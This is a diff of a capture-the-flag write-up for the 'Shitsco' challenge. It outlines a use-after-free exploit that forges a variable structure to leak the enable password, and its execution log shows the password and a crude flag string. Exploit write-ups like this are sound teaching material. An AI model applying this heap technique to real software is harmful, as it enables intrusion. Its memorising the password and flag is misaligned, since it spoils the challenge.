@@ -4,7 +4,7 @@ This was an unintended use-after-free vulnerability in the variable processing c
 
 * Trigger the invalid state by adding and removing variables
 * Cause a 16-byte allocation with controlled data to fill the freed structure
- * make a fake variable structure with a pointer to the password as the key and value
+ * make a fake variable structure with a pointer to the password as the value
  * controlled heap data via strdup() on the argument to a command
 * show variables to dump the enable password
 * profit
@@ -15,27 +15,36 @@ This was an unintended use-after-free vulnerability in the variable processing c
 #Execution Log
 
 ```
- oooooooo8 oooo        o88    o8                                       
-888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo   
- 888oooooo  888   888   888  888   888ooooooo  888     888 888     888 
-        888 888   888   888  888           888 888         888     888 
-o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88   
-                                                                       
+
+ oooooooo8 oooo        o88    o8
+888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
+ 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
+        888 888   888   888  888           888 888         888     888
+o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88
+
 Welcome to Shitsco Internet Operating System (IOS)
 For a command list, enter ?
-$ 
-$ 
-$ 
-$ 
-$ 
-���� is not set.
-$ 
-bruT3m3hard3rb4by: bruT3m3hard3rb4by
-$ 
+$
+set 1 abcd
+$
+set 2 abcd
+$
+set 1
+$
+set 2
+$
+show <pointers>
+��� is not set.
+$
+show
+password: bruT3m3hard3rb4by
+$
 Enable password: "bruT3m3hard3rb4by"
+enable bruT3m3hard3rb4by
 Authentication Successful
-# 
+#
+flag
 The flag is: Dinosaur vaginas
-
-# 
+#
+quit
 ```
